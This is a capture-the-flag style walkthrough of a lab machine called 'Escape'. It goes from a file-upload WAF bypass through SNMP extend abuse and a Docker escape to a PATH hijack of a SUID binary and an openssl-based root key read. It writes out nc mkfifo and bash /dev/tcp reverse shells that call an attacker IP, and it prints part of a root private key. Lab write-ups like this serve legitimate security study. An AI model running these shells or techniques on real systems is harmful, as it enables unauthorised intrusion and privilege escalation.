# Escape

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 -Pn 192.168.157.113
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-14 16:01 +08
Nmap scan report for 192.168.157.113
Host is up (0.18s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
```

### Web Enumeration -> File Upload

Visiting both the websites shows nothing. The page source just shows this:

```markup
<html>
<head>

<style type="text/css">
 <!--
 body {
  background-image: url(jail.jpg);
 }
 ->
</style>

<title>Escape</title>
</head>
<body>
</body>
</html>
```

I ran a `feroxbuster` on both, and found a `/dev` endpoint on port 8080.

```
$ feroxbuster -u http://192.168.157.113:8080
[>-------------------] - 2s        89/30000   42/s    http://192.168.157.113:8080/dev 
[--------------------] - 0s         0/30000   0/s     http://192.168.157.113:8080/dev/uploads
```

<figure><img src="../../../.gitbook/assets/image (3736).png" alt=""><figcaption></figcaption></figure>

This was a PHP page, so uploading PHP reverse shells is the priority, and there's a pretty good WAF. I tested loads of method of bypassing it, and this machine requires a combination of quite a few.&#x20;

<figure><img src="../../../.gitbook/assets/image (3731).png" alt=""><figcaption></figcaption></figure>

* File Header Spoofing
* Double File Extension
* Content-Type Spoofing

We can get a reverse shell by loading the uploaded file:

<figure><img src="../../../.gitbook/assets/image (2855).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### SNMP -> Docker Escape

We spawned in a Docker container. The `/var/backups` folder contained a `.conf` file for SNMP:

```
www-data@a7c367c2113d:/var/backups$ ls -la
total 20
drwxr-xr-x 1 root root 4096 Dec 21  2020 .
drwxr-xr-x 1 root root 4096 Nov 18  2020 ..
-rwxr--r-- 1 root root 7340 Dec  9  2020 .snmpd.conf
```

Here are the interesting bits:

```
###############################################################################
#
#  ACCESS CONTROL
#

                                                 #  system + hrSystem groups only
view   systemonly  included   .1.3.6.1.2.1.1
view   systemonly  included   .1.3.6.1.2.1.25.1

                                                 #  Full access from the local host
#rocommunity public  localhost
                                                 #  Default access to basic system info
 rocommunity public  default    -V systemonly
                                                 #  rocommunity6 is for IPv6
 rocommunity6 public  default   -V systemonly

 rocommunity 53cur3M0NiT0riNg
 
<TRUNCATED>
 extend    test1   /bin/echo  Hello, world!
 extend-sh test2   echo Hello, world! ; echo Hi there ; exit 35
 extend-sh test3   /bin/sh /tmp/shtest
<TRUNCATED>
```

Firstly, we have the password string required. Next, we have some sort of script execution within the machine. We can put a reverse shell there instead.&#x20;

```bash
#!/bin/bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.45.227 21 >/tmp/f
```

Then, transfer this using `curl` and `chmod 777` it. To execute the shell, run this:

```bash
$ snmpbulkwalk -c 53cur3M0NiT0riNg -v2c 192.168.157.113 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```

<figure><img src="../../../.gitbook/assets/image (3465).png" alt=""><figcaption></figcaption></figure>

### LogRotate SUID -> PATH Hijack

I checked for SUID binaries present within this machine:

```
Debian-snmp@escape:/$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/logconsole
```

`logconsole` was the one I didn't recognise.&#x20;

```
Debian-snmp@escape:/$ file /usr/bin/logconsole                                               
/usr/bin/logconsole: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d3102ed1d950486fed01c5ad8915511a12aea52d, for GNU/Linux 3.2.0, not stripped                                             
Debian-snmp@escape:/$ /usr/bin/logconsole --version                                          
                                                                                             
                                                                                             
 /$$                                                                       /$$               
| $$                                                                      | $$               
| $$  /$$$$$$   /$$$$$$   /$$$$$$$  /$$$$$$  /$$$$$$$   /$$$$$$$  /$$$$$$ | $$  /$$$$$$      
| $$ /$$__  $$ /$$__  $$ /$$_____/ /$$__  $$| $$__  $$ /$$_____/ /$$__  $$| $$ /$$__  $$     
| $$| $$  \ $$| $$  \ $$| $$      | $$  \ $$| $$  \ $$|  $$$$$$ | $$  \ $$| $$| $$$$$$$$     
| $$| $$  | $$| $$  | $$| $$      | $$  | $$| $$  | $$ \____  $$| $$  | $$| $$| $$_____/     
| $$|  $$$$$$/|  $$$$$$$|  $$$$$$$|  $$$$$$/| $$  | $$ /$$$$$$$/|  $$$$$$/| $$|  $$$$$$$     
|__/ \______/  \____  $$ \_______/ \______/ |__/  |__/|_______/  \______/ |__/ \_______/     
               /$$  \ $$                                                                     
              |  $$$$$$/                                                                     
               \______/                                                                      
                                                                                             
                                                                                                                                                                                          
1. About the Sytem                                                                           
2. Current Process Status                                                                    
3. List all the Users Logged in and out                                                      
4. Quick summary of User Logged in                                                           
5. IP Routing Table                                                                          
6. CPU Information                                                                           
7. To Exit                                                                                   
99. Generate the Report                                                                      
                                                                                             
Enter the option ==> 
```

It seems like a custom binary. As such, I ran it through `ltrace` to see what it was executing with each option.

```
__isoc99_scanf(0x56520b53f5c6, 0x7ffe428ae678, 0x7f317a52b8c0, 02                            
) = 1                                                                                        
printf("\033[0m")                                = 4                                         
putchar(10, 0x7ffe428abfd0, 0x56520b53f650, 0
)   = 10
system("/bin/ps aux"USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.1  0.8 159660  8976 ?        Ss   03:58   0:01 /sbin/init
```

it's executing `system` calls for each option. When I checked the last option, it runs `lscpu` without the full path:

```
__isoc99_scanf(0x56520b53f5c6, 0x7ffe428ae678, 0x7f317a52b8c0, 06                            
) = 1                                                                                        
printf("\033[0m")                                = 4                                         
putchar(10, 0x7ffe428abfd0, 0x56520b53f650, 0
)   = 10
system("lscpu"Architecture:        x86_64
```

This means we can create our own `lscpu` binary to run.&#x20;

```
$ cat lscpu 
bash -c 'bash -i >& /dev/tcp/192.168.45.227/443 0>&1'
```

Then, place this within `/tmp` and `chmod 777` it. Afterwards, change the PATH variable and run the `logconsole` binary to check for CPU information.

```bash
export PATH=/tmp:$PATH
```

<figure><img src="../../../.gitbook/assets/image (3579).png" alt=""><figcaption></figcaption></figure>

### OpenSSL -> File Read

Within the `/opt` directory, there's an `openssl` binary that only `tom` can execute:

```
tom@escape:/opt/cert$ ls -la
total 724
drwxr-xr-x 2 root root   4096 Dec  9  2020 .
drwxr-xr-x 4 root root   4096 Dec  9  2020 ..
-rwx------ 1 root root   1245 Dec  9  2020 certificate.pem
-rwx------ 1 root root   1704 Dec  9  2020 key.pem
-rwxr-x--- 1 tom  tom  723944 Dec  9  2020 openssl
```

We are also given some certs and keys. I first checked this `openssl` binary using `getcap`, finding that it has all capabilities enabled, meaning that we can read any file:

```
tom@escape:/dev/shm$ getcap /opt/cert/openssl
/opt/cert/openssl =ep
```

We can then use this to read the private SSH key of `root`:

```
tom@escape:/dev/shm$ /opt/cert/openssl enc -in "/root/.ssh/id_rsa"
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAwwvvVIS3//uz+Mpg24l51p48akveZgI8bDQDun7y9BKhRDWg
GzIzCpt7NcVWVN2llo9KOL3c3EZZxGOaTbzpINZxSWj3/WWBYhNqmKQRsgJzbPv2
kOe/XwWw8Bt9TuFAd7GUbylpbyHOES7siXFUd/XP503ehllp/JFp0G+2YPkYPGbi
0EISJcNFPNnRlXIQs3Fte0QqFiPE9nPycSMqvGz8a9OtaPGlmOZ3wP56jxxIBT0I
SrkfuLGw7b9VN05jJ33EMtDGRyyDLljFXv7t5OktkC0omumXyWG2KRRe3Avn4RMI
<TRUNCATED>
```

<figure><img src="../../../.gitbook/assets/image (1292).png" alt=""><figcaption></figcaption></figure>
